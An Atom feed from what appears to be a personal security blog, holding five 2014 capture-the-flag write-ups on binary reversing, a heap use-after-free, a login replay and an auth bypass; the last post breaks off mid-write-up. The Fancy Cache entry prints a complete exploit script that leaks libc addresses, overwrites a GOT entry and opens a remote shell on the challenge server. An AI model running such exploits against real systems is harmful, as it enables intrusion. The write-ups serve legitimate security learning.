<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Reversing | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/reversing/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-27T10:31:15+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce/"/>
    <updated>2014-12-24T11:38:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce</id>
    <content type="html"><![CDATA[<p>Bruteforce they said, it&rsquo;ll be fun, they said&hellip;</p>

<!-- more -->


<p>We&rsquo;re given only a binary and are told that we shouldn&rsquo;t bruteforce the server. The binary, when started, only says &ldquo;calculating&hellip;..&rdquo; and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:</p>

<pre><code>   0x400703:    movsxd rax,DWORD PTR [rsp+0x8]
=&gt; 0x400708:    cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078
   0x40070f:    je     0x400780
   0x400711:    add    DWORD PTR [rsp+0xc],0x1
</code></pre>

<p>If <code>eax</code> matches the value at <code>0x601078</code>, then the code jumps here:</p>

<pre><code>  400780:   8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]
  400784:   be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 ("the flag is: ADCTF_%d\n")
  400789:   bf 01 00 00 00          mov    edi,0x1
  40078e:   31 c0                   xor    eax,eax
  400790:   e8 7b fe ff ff          call   400610 &lt;__printf_chk@plt&gt;
</code></pre>

<p>So the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:</p>

<pre><code>  4008e0:   49 89 ce                mov    r14,rcx
  4008e3:   48 89 fa                mov    rdx,rdi
  4008e6:   4c 89 d7                mov    rdi,r10
  4008e9:   4c 89 ce                mov    rsi,r9
  4008ec:   48 31 c0                xor    rax,rax
  4008ef:   b0 23                   mov    al,0x23  ; nanosleep
  4008f1:   0f 05                   syscall 
</code></pre>

<p>I didn&rsquo;t want to slow it down so I nop&#8217;ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was&hellip; but it still was very slow! Time for a different approach&hellip;</p>

<p>Running the binary and breaking at the comparison at <code>0x400708</code>, I compared the value at <code>rsp+0x8</code> and <code>rsp+0xc</code> (which is used to print out the flag eventually). I noticed these numbers:</p>

<pre><code>rsp+0x8     rsp+0xc
-------------------
    1           1
    2           2
    3           5
    4           7
    5           11
</code></pre>

<p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>

<p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[9447 CTF: Rolling]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling/"/>
    <updated>2014-12-02T20:43:25+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling</id>
    <content type="html"><![CDATA[<p>The last flag for 9447 CTF that I got was this binary reversing challenge. Let&rsquo;s get <code>rolling</code>!</p>

<!--more-->


<p>Identifying the binary with file showed that it was a 64-bit ELF, dynamically linked. Unfortunately for me, it was linked against a higher <code>libc</code> version:</p>

<pre><code class="bash">bas@tritonal:~/tmp/9447$ ./rolling 
./rolling: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.14' not found (required by ./rolling)
</code></pre>

<p>To solve this issue, I needed a way to get the program to use a newer version of libc. One way to do this is using <code>LD_PRELOAD</code>. I downloaded a <a href="http://pkgs.org/ubuntu-14.10/ubuntu-main-amd64/libc6_2.19-10ubuntu2_amd64.deb.html">newer libc deb</a>, that ought to be binary compatible with my debian box. After unpacking <code>ld-2.19.so</code> and <code>libc-2.19.so</code>, I could start the binary like this:</p>

<pre><code class="bash">bas@tritonal:~/tmp/9447$ LD_PRELOAD=./libc-2.19.so ./ld-2.19.so ./rolling
Fynd i mewn i cyfrinair
</code></pre>

<p>And in <code>gdb</code>:</p>

<pre><code class="bash">gdb-peda$ set environment LD_PRELOAD=./libc-2.19.so ./ld-2.19.so
gdb-peda$ r
Fynd i mewn i cyfrinair

Program received signal SIGSEGV, Segmentation fault.
&lt;snip&gt;
</code></pre>

<p>The program would still segfault, but at least it ran. Okay, let&rsquo;s get to work. The strange string meant nothing to me, but it&rsquo;s Welsh for &ldquo;Enter a password&rdquo;. Of course, the description on 9447 mentioned that the binary would take an input. The flag is the input which the binary accepts. I ran the binary with an argument, which resulted in another Welsh string. <code>strings</code> identified the last Welsh string. I looked up their meaning via Google Translate and their address in <code>gdb</code>:</p>

<pre><code class="bash">Nac oes. Ceisiwch eto. == No. Try again. // rolling : 0x600865 ("Nac oes. Ceisiwch eto.")
Llongyfarchiadau == Congratulations // rolling : 0x600854 ("Llongyfarchiadau")
</code></pre>

<p>These strings look like the &ldquo;Good&rdquo;/&ldquo;Bad&rdquo; output that we expect for this input-checking binary! Switching over to the output of <code>objdump</code>, I looked up where these strings are referenced:</p>

<pre><code class="bash">  400771:   48 8b 55 f0             mov    -0x10(%rbp),%rdx
  400775:   48 83 c2 08             add    $0x8,%rdx
  400779:   48 8b 12                mov    (%rdx),%rdx
  40077c:   48 89 d7                mov    %rdx,%rdi
  40077f:   ff d0                   callq  *%rax        # interesting function
  400781:   85 c0                   test   %eax,%eax    # if eax == 1 -&gt; success
  400783:   74 0c                   je     400791 &lt;memcpy@plt+0x2b1&gt;
  400785:   bf 54 08 40 00          mov    $0x400854,%edi               # Llong...
  40078a:   e8 11 fd ff ff          callq  4004a0 &lt;puts@plt&gt;
  40078f:   eb 16                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
  400791:   bf 65 08 40 00          mov    $0x400865,%edi               # Nac oes... 
  400796:   e8 05 fd ff ff          callq  4004a0 &lt;puts@plt&gt;
  40079b:   eb 0a                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
  40079d:   bf 7c 08 40 00          mov    $0x40087c,%edi
  4007a2:   e8 f9 fc ff ff          callq  4004a0 &lt;puts@plt&gt;
  4007a7:   b8 00 00 00 00          mov    $0x0,%eax
  4007ac:   c9                      leaveq 
  4007ad:   c3                      retq  
</code></pre>

<p>The <code>test eax, eax</code> at <code>0x400781</code> controls which path is taken: either OK (&ldquo;Llong&hellip;&rdquo;) or not OK (&ldquo;Nac oes&hellip;&rdquo;). The value of <code>eax</code> is probably set by the function that is called at <code>0x40077f: callq  *%rax</code>. Switching back to <code>gdb</code>, I set a breakpoint on <code>0x40077f</code> and prepared to trace that function.</p>

<pre><code class="bash">gdb-peda$ b *0x40077f
Breakpoint 1 at 0x40077f
gdb-peda$ r bleh
...
[-------------------------------------code-------------------------------------]
   0x400775:    add    rdx,0x8
   0x400779:    mov    rdx,QWORD PTR [rdx]
   0x40077c:    mov    rdi,rdx
=&gt; 0x40077f:    call   rax
   0x400781:    test   eax,eax
   0x400783:    je     0x400791
...
Breakpoint 1, 0x000000000040077f in ?? ()
</code></pre>

<p>The binary was halted at the <code>call eax</code> instruction. I entered <code>ni</code> to step into the function. This is where the fun really starts, it is where our string is checked for validity. There&rsquo;s a red herring in there too. The function starts like this:</p>

<pre><code>gdb-peda$ x/40i $rip
=&gt; 0x7ffff7ff5000:  push   rbp
   0x7ffff7ff5001:  mov    rbp,rsp
   0x7ffff7ff5004:  sub    rsp,0x10
   0x7ffff7ff5008:  mov    QWORD PTR [rbp-0x8],rdi
   0x7ffff7ff500c:  mov    rax,QWORD PTR [rbp-0x8]
   # grab first byte of input
   0x7ffff7ff5010:  movzx  eax,BYTE PTR [rax]   
   # is it '9'?
   0x7ffff7ff5013:  cmp    al,0x39
   # if so, jump away
   0x7ffff7ff5015:  je     0x7ffff7ff5143   
   # else:
   0x7ffff7ff501b:  mov    rax,QWORD PTR [rbp-0x8] 
   # grab first byte of input
   0x7ffff7ff501f:  movzx  eax,BYTE PTR [rax]   
   # is it 'f'?
   0x7ffff7ff5022:  cmp    al,0x66          
   # if not, jump away
   0x7ffff7ff5024:  jne    0x7ffff7ff5139   
   0x7ffff7ff502a:  mov    rax,QWORD PTR [rbp-0x8]
   # second byte of input
   0x7ffff7ff502e:  add    rax,0x1      
   0x7ffff7ff5032:  movzx  eax,BYTE PTR [rax]
   # is it 'l'?
   0x7ffff7ff5035:  cmp    al,0x6c  
   0x7ffff7ff5037:  jne    0x7ffff7ff5139
   0x7ffff7ff503d:  mov    rax,QWORD PTR [rbp-0x8]
   # third byte of input
   0x7ffff7ff5041:  add    rax,0x2
   0x7ffff7ff5045:  movzx  eax,BYTE PTR [rax]
   # is it 'a'?
   0x7ffff7ff5048:  cmp    al,0x61
</code></pre>

<p>I was all super excited and started to trace the path that started spelling out <code>flag</code>, each time adjusting <code>al</code> to the value that it was being compared to (in <code>gdb</code>, this can be done by executing <code>set $al=0x66</code>). However, this path spelled out <code>flagstartswith9</code>. In other words, I fell for the red herring. D&#8217;oh! The other code path started comparing the input to <code>9</code>, so I restarted the binary and entered <code>9447</code> as the input. Re-tracing the check-input function, I noticed that the code had changed!</p>

<pre><code># Input 'bleh':
   0x7ffff7ff5022:  cmp    al,0x66  
# Input '9447'
   0x7ffff7ff5022:  cmp    al,0x34
</code></pre>

<p>Very fancy. I traced the function further, ending up here:</p>

<pre><code>gdb-peda$ 
[----------------------------------registers-----------------------------------]
RAX: 0x72 ('r')
...
[-------------------------------------code-------------------------------------]
   0x7ffff7ff5062:  movzx  eax,BYTE PTR [rax]
   0x7ffff7ff5065:  movsx  eax,al
   0x7ffff7ff5068:  add    eax,0x39
=&gt; 0x7ffff7ff506b:  cmp    edx,eax
</code></pre>

<p>This is the fifth character of the password and seems to be <code>r</code>. I did a quick <code>set $edx=$eax</code> and moved on. The next bytes were <code>oll</code>, so I expected the following check to be for <code>i</code>. However, the password function borked, because it was using the first four characters to generate the next four! I had only entered four in total. The name of the binary, <code>rolling</code>, makes a bit more sense now :)</p>

<pre><code># grab eight input byte
   0x7ffff7ff50c1:  mov    rax,QWORD PTR [rbp-0x8]
   0x7ffff7ff50c5:  add    rax,0x7
   0x7ffff7ff50c9:  movzx  eax,BYTE PTR [rax]
=&gt; 0x7ffff7ff50cc:  movsx  eax,al
# grab third input byte...
   0x7ffff7ff50cf:  mov    rdx,QWORD PTR [rbp-0x8]
   0x7ffff7ff50d3:  add    rdx,0x3
   0x7ffff7ff50d7:  movzx  edx,BYTE PTR [rdx]
   0x7ffff7ff50da:  movsx  edx,dl
# ... and add 0x35 to that third byte!
   0x7ffff7ff50dd:  add    edx,0x35
# compare [3]+0x35 to [7]:
   0x7ffff7ff50e0:  cmp    eax,edx
</code></pre>

<p>This meant I just had to re-run the binary once I had four more characters. No problem! Eventually, at each <code>cmp</code> execution, I noted the proper byte and the correct input turned out to be <code>9447rollingisfun</code>.</p>

<p>The flag was <code>9447{9447rollingisfun}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PicoCTF - Fancy Cache]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache/"/>
    <updated>2014-11-06T23:49:03+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache</id>
    <content type="html"><![CDATA[<p>Fancy Cache was another &ldquo;Master Challenge&rdquo; for PicoCTF. It featured a custom server, which allegedly creates a cache of strings. It&rsquo;s up to us to break it!</p>

<!--more-->


<p>We are given the source code, the binary, a libc library and a client written in Python. Wow! <code>fancy_cache</code> communicates in a difficult way, but luckily, all the heavy lifting is already done for us in <code>client.py</code>! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:</p>

<pre><code class="c">struct cache_entry *cache_lookup(struct string *key) {
  size_t i;
  for (i = 0; i &lt; kCacheSize; ++i) {
    struct cache_entry *entry = &amp;cache[i];

    // Skip expired cache entries.
    if (entry-&gt;lifetime == 0) {
      continue;
    }

    if (string_eq(entry-&gt;key, key)) {
       return entry;
    }
  }

  return NULL;
}

void do_cache_get(void) {
  struct string key;
  string_init(&amp;key);
  read_into_string(&amp;key);

  struct cache_entry *entry = cache_lookup(&amp;key);
  if (entry == NULL) {
    write(STDOUT_FILENO, &amp;kNotFound, sizeof(kNotFound));
    return;
  }

  write(STDOUT_FILENO, &amp;kFound, sizeof(kFound));
  write_string(entry-&gt;value);

  --entry-&gt;lifetime;
  if (entry-&gt;lifetime &lt;= 0) {
    // The cache entry is now expired.
    fprintf(stderr, "Destroying key %s\n", entry-&gt;key-&gt;data);
    string_destroy(entry-&gt;key);
    fprintf(stderr, "Destroying value %s\n", entry-&gt;value-&gt;data);
    string_destroy(entry-&gt;value);
  }
}
</code></pre>

<p>The function <code>do_cache_get</code> will free a string struct when the lifetime goes below zero, but <code>cache_lookup</code> will happily return entries with a negative lifetime. That means we can free a string struct, <em>somehow</em> write to it, and influence the cache entries! After calls to <code>free()</code>, subsequent calls to <code>malloc()</code> will usually return recently freed memory. For instance, consider this sequence:</p>

<pre><code class="bash"># start our server
bas@tritonal:~/tmp/picoctf/fancy_cache$ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache
</code></pre>

<p>And modify the client.py script a bit:</p>

<pre><code class="python"># Add an entry with a negative lifetime. This will fool cache_lookup.
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

# Now request the value of 'bleh'
print cache_get(f, 'bleh')
</code></pre>

<p>This results in the following debug output of the local server:</p>

<pre><code class="bash">malloc(12) = 0x8598008 (string_create)
realloc((nil), 7) = 0x8598018 (read_into_string)
malloc(12) = 0x8598028 (string_create)
realloc((nil), 8) = 0x8598038 (read_into_string)
realloc((nil), 7) = 0x8598048 (read_into_string)
Destroying key
free(0x8598008) (string_destroy str)
Destroying value
free(0x8598028) (string_destroy str)
realloc((nil), 4) = 0x8598028 (read_into_string)
</code></pre>

<p>At first, the code allocates <code>0x8598008</code> and <code>0x8598028</code> as <code>key</code> and <code>value</code> string structs, respectively. Then, we request the value of &lsquo;keyAAAA&rsquo;, causing do_cache_get to free that memory again. Next, we request the value of the non-existent key &lsquo;bleh&rsquo;. However, the program allocates space at <code>0x8598028</code>, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let&rsquo;s first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says <code>REDACTED</code>. In order for this work, cache->key->data must point to a real string. I choose &lsquo;printf&rsquo; in the binary. So:</p>

<ul>
<li>We register a struct string with lifetime -1.</li>
<li>We fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0</li>
<li>We try to request another string struct, but this will allocate the old memory location and overwrite the old alloc’ed key &amp; value regions (still valid according to cache_lookup()!).</li>
<li>We “write” a string struct into value:
<code>bash
old_value-&gt;length = 0xff
old_value-&gt;capacity = 0x00
old_value-&gt;data = pointer to whatever we want to read
</code></li>
<li>We write a string struct into key:</li>
</ul>


<pre><code class="bash">old_key-&gt;length = 0x6
old_key-&gt;cap = 0x00
old_key-&gt;data = pointer to string that is known, like printf -&gt;      0x8048310
</code></pre>

<p>We need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:</p>

<pre><code class="c">    if (string_eq(entry-&gt;key, key)) {
       return entry;
    }
</code></pre>

<ul>
<li>We request the key called &lsquo;printf&rsquo;; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!</li>
</ul>


<pre><code class="python">### modifications to client.py:

# Add an entry to the cache
assert cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
# Delete from cache
print cache_get(f, 'keyAAAA')
# This is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)). 
print cache_get(f, '\xff\x00\x00\x00\x00\x00\x00\x00\xc9\x8b\x04\x08')
# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
print cache_get(f, '\x06\x00\x00\x00\x06\x00\x00\x00\x10\x83\x04\x08')
# Print the actual data!
print cache_get(f, 'printf')
</code></pre>

<p>This gives the following output locally:</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
AAAA____
None
None
REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED RED
</code></pre>

<p>And for the remote server:</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 

AAAA____
None
None
ongratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shel
</code></pre>

<p>Aha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of <code>memcmp</code>, which we need to defeat ASLR. Using the same read memory trick, we grab the address of <code>memcmp</code>, which is stored at <code>0x804b014</code>. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to <code>0x804b014</code> by doing a cache_set call. Finally, we need to trigger <code>memcmp</code>, which now actually calls <code>system</code>. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what&rsquo;s going on):</p>

<pre><code class="python">#!/usr/bin/python
import struct
import socket
import telnetlib

def pack4(v):
    """
    Takes a 32 bit integer and returns a 4 byte string representing the
    number in little endian.
    """
    assert 0 &lt;= v &lt;= 0xffffffff
    # The &lt; is for little endian, the I is for a 4 byte unsigned int.
    # See https://docs.python.org/2/library/struct.html for more info.
    return struct.pack('&lt;I', v)

def unpack4(v):
    """Does the opposite of pack4."""
    assert len(v) == 4
    return struct.unpack('&lt;I', v)[0]

CACHE_GET = 0
CACHE_SET = 1

kNotFound = 0x0
kFound = 0x1
kCacheFull = 0x2

def write_string(f, s):
    f.write(pack4(len(s)))
    f.write(s)

def read_string(f):
    size = unpack4(f.read(4))
    return f.read(size)

def cache_get(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kNotFound:
        return None
    assert status == kFound

    return read_string(f)

# We need this modified function, because once we hit system('/bin/sh'),
# there will be no more data sent back in the way that the original 
# function expects. This causes it to b0rk.
def cache_get2(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

def cache_set(f, key, value, lifetime):
    f.write(chr(CACHE_SET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kCacheFull:
        return False
    assert status == kFound

    write_string(f, value)
    f.write(pack4(lifetime))
    return True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('vuln2014.picoctf.com', 4548))
f = s.makefile('rw', bufsize=0)

# Command to be executed later, once we've overwritten memcmp@plt.
cmd = '/bin/sh\x00'

# Add an entry to the cache; we will use this command later to spawn the shell. 
cache_set(f, cmd, "payload", 1000)

# Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:
'''
    // Skip expired cache entries.
    if (entry-&gt;lifetime == 0) {
      continue;
    }
'''
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

'''
// This is how the string struct looks like:
struct string {
  size_t length;
  size_t capacity;
  char *data;
};
'''
# Now, we request the value of a key called '\x04\x00\x00\x00\x00\x00\x00\..."
# but this is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)),
# because malloc will re-use this address.
# Leak memcmp address @ 0x804b014
cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))

# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
cache_get(f, pack4(6)+pack4(6)+pack4(0x8048310))

# Grab memcmp address:
addr_memcmp = unpack4(cache_get(f, 'printf'))
print "[+] Leaking memcmp address: {}".format(hex(addr_memcmp))

# Calculate system address:
addr_system = addr_memcmp - 0x142870 + 0x40100 
print "[+] Calculated system address: {}".format(hex(addr_system))

# Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. 
# We'd love to abuse our old cache entry again, but alas, the memory regions have again been 
# freed(), due to cache_get seeing a lifetime &lt;= 0.
# We'll restore them, so we can abuse them again to write to 0x804b014.

cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))
cache_get(f, pack4(6)+pack4(0)+pack4(0x8048310))

print "[+] Attempting to overwrite memcmp pointer..."
assert cache_set(f, 'printf', pack4(addr_system), 1)

print "[+] Running {} on remote box".format(cmd)
print cache_get2(f, cmd)

# Once you get the service to run a shell, this lets you send commands
# to the shell and get the results back :-)

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>Running it lands us a shell!</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
AAAA____
[+] Leaking memcmp address: 0xf7686870
[+] Calculated system address: 0xf7584100
[+] Attempting to overwrite memcmp pointer...
[+] Running /bin/sh on remote box
None
id
uid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)
ls /home/ 
bleichenbacher
easyoverflow
ecb
fancy_cache
guess
hardcore_owner
lowentropy
netsino
policerecords
ubuntu
ls /home/fancy_cache
fancy_cache
fancy_cache.sh
flag.txt
cat /home/fancy_cache/flag.txt
that_wasnt_so_free_after_all
</code></pre>

<p>The flag is <code>that_wasnt_so_free_after_all</code>. Fancy indeed!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcamp CTF: Network 200]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-200/"/>
    <updated>2014-11-01T15:08:59+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-200</id>
    <content type="html"><![CDATA[<p>This writeup is about Defcamp CTF&rsquo;s Network 200. Again, we get a clue!</p>

<p><code>That ****ing manager got smarter. He moved to house number 22, but we got this: ****managers.pcap</code></p>

<!--more-->


<p>Profanity aside, house number 22 probably means that the ip address of this challenge is <code>10.13.37.21</code>. The pcap file contains network traffic of the manager logging in to the page at 10.13.37.21. Upon examination of this page, it seems it generates a nonce. This nonce is to encode the md5 of the password, which it then sent over as GET parameters.</p>

<p>Looking at the pcap file, Swappage quickly identified this:</p>

<pre><code>user=manager&amp;nonce=7413734ab666ce02cf27c9862c96a8e7&amp;pass=3ecd6317a873b18e7dde351ac094ee3b
</code></pre>

<p>So we need to reverse this nonce-based encryption to get the md5&#8217;ed password of manager. The source of the login page reveals that the nonce is valid for about 100 seconds and the function that is used to generate the encoded password:</p>

<pre><code class="javascript">$('.hook-submit').click(function(){
  var h1 = md5($('#pass').val());
  var h2 = $('#nonce').val();
  var xor = myxor(h1, h2);
  $('#hiddenpass').val(xor);
  setTimeout(function() { $('#form').submit(); }, 100);
});
</code></pre>

<p>This threw me off. I thought the nonce and md5 were <code>XOR</code>ed together. I couldn&rsquo;t be further from the truth. After wasting some time, I investigated the javascript:</p>

<pre><code class="javascript">...snip...

function hex2n(c) {
    if(is_numeric(c)) return parseInt(c);
    return ord(c) - ord('a') + 10;
}

function n2hex(n) {
    if(n &lt; 10) { return '' + n; }
    return chr(ord('a') + n - 10);
}

function myxor(h1, h2) {
    var xored = '';
    for(i = 0; i&lt;h1.length; i++) {
        var c1 = h1.charAt(i);
        var c2 = h2.charAt(i);
        alert(hex2n(c1)); // DEBUG by barrebas
        alert(hex2n(c2)); // DEBUG by barrebas
        alert(n2hex((hex2n(c1) + hex2n(c2)) % 16)); // DEBUG by barrebas
        xored += n2hex((hex2n(c1) + hex2n(c2)) % 16);
    } 
    return xored;
}
</code></pre>

<p>With a few carefully placed <code>alert()</code>s, I was able to figure out that the <code>myxor</code> function takes each hex character of the nonce and the md5. These values are converted to integers and then added together. After a modulus 16 the hex-representation of the result is added to the output.</p>

<p>I wrote a small piece of python to do the reverse operation for me, given the nonce and the encoded md5:</p>

<pre><code class="python">#!/usr/bin/python

nonce = 'efa6085790a0294851202602a4833ad1'
epass = '3ecd6317a873b18e7dde351ac094ee3b'

def makeHex(c):
    return hex(c)[2:]

def getHex(c):
    return int(''.join(('0',c)), 16)

output = ''
for i in range(len(epass)):
    output += makeHex((getHex(epass[i]) - getHex(nonce[i])) % 16)

print output
</code></pre>

<p>This returned the md5 of the managers&#8217; password: <code>cabaf0ddf21df38cbeb77c94a40e4654</code>. Unfortunately, the Mighty Google did not return any hits when searching for it. Who needs it anyway? We have the md5 of the password, all we need to do is to re-encode it with a new nonce and submit it! I refreshed the login page, grabbed the nonce and ran the following piece of python:</p>

<pre><code class="python">#!/usr/bin/python

nonce = 'efa6085790a0294851202602a4833ad1'
epass = '3ecd6317a873b18e7dde351ac094ee3b'
passval = 'cabaf0ddf21df38cbeb77c94a40e4654'

def makeHex(c):
    return hex(c)[2:]

def getHex(c):
    return int(''.join(('0',c)), 16)

output = ''
for i in range(len(epass)):
    output += makeHex((getHex(passval[i]) + getHex(nonce[i])) % 16)

print output
</code></pre>

<p>This returned a new, encoded md5 of the password. I copied it and entered <code>manager:idontcare</code> in the login form. I intercepted this request with TamperData, substituting the new, encoded md5 value for the old one and hit submit. Lo and behold:</p>

<pre><code>The secret is behind bb00403ebcbfa0748bcbee426acfdb5b :)
</code></pre>

<p>Which is the md5 of <code>youtoo</code>, which thankfully was the proper flag!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS-CTF: Secure Hobby]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/31/asis-ctf-secure-hobby/"/>
    <updated>2014-10-31T14:56:11+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/31/asis-ctf-secure-hobby</id>
    <content type="html"><![CDATA[<p>For Secure Hobby, a 250 point challenge, we were given a file and a place to connect to. The archive contained a binary, which looked okay enough to run. It opened a port on localhost. Upon connecting using <code>nc</code>, the program first crashes because it can&rsquo;t find <code>flag</code> and <code>namak</code>. After creating those files and connecting again, we are presented with the following:</p>

<!--more-->


<pre><code class="bash">$ nc localhost 35565
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: test
Your key for login is: 6447567a64413d3d098f6bcd4621d373cade4e832627b4f6
</code></pre>

<p>Hmm. The second function verifies a login and the third displays a secret. Trying to register the user &lsquo;admin&rsquo; resulted in an error. Still, it&rsquo;s fair to assume we need to get the secret of the admin user. Let&rsquo;s break this key down.</p>

<pre><code class="bash">$ echo -ne 'test' |md5sum
098f6bcd4621d373cade4e832627b4f6  -
</code></pre>

<p>This looks like the last part of the login. What about the start? It seems to end with <code>\x3d</code> which is ASCII <code>=</code>. This screams base64!</p>

<pre><code class="bash">$ xxd -p -r
6447567a64413d3d
dGVzdA==
$ echo -ne 'dGVzdA==' |base64 -d
test
</code></pre>

<p>So putting it all together again:</p>

<pre><code class="bash">$ echo -ne 'admin' |base64
YWRtaW4=
$ echo -ne 'admin' |md5sum
21232f297a57a5a743894a0e4a801fc3  -
xxd -p 
YWRtaW4=
595752746157343d0a
</code></pre>

<p>Looks like <code>595752746157343d21232f297a57a5a743894a0e4a801fc3</code> is the login we need! But alas, this doesn’t work. On the remote box, registering <code>test</code> returns:</p>

<pre><code class="bash">$ nc asis-ctf.ir 12439
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: test
Your key for login is: 6447567a64413d3dd0211e3e26985465726312d056f9339f
</code></pre>

<p>It has to do with the <code>namak</code> file. Namak is Persian for salt.</p>

<pre><code class="bash">$ echo '0' &gt; namak
</code></pre>

<p>Now, registering test on the localhost server returns <code>Your key for login is: 6447567a64413d3d1c13f2701648e0b0d46d8a2a5a131a53</code>. Furthermore, it looks like the salt is prepended to before hashing. We grabbed md5(salt) using a small Python script:</p>

<pre><code class="python">#!/usr/bin/python

from socket import *
import time, re, struct

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 35565))
s.connect(('asis-ctf.ir', 12439))

print s.recv(256)

s.send('1\n')
print s.recv(256)

s.send('\n')

print s.recv(200)
print s.recv(200)
</code></pre>

<p>The output showed:</p>

<pre><code class="bash">Enter username: 
Your key for login is: 
5624717e9a5fd673f17f5678c6303ffe
</code></pre>

<p>So the md5 of the salt would be <code>5624717e9a5fd673f17f5678c6303ffe</code>. I enlisted the help of NullMode to crack this hash, but to no avail. Instead of cracking this hash (seems inpossible), we decided to focus on the string comparison. We cannot register a username containing <code>admin</code>, but perhaps we can circumvent this checking system somehow. First, I tried:</p>

<pre><code>admin                                              #
</code></pre>

<p>But this led to the same error message. Apparently, the username is not truncated. Instead, we assumed the check-string-for-admin uses normal string routines. These stop when they encounter a null-byte. Hash-functions on the other hand, do not. Let&rsquo;s register a user <code>\x00admin</code> using Python:</p>

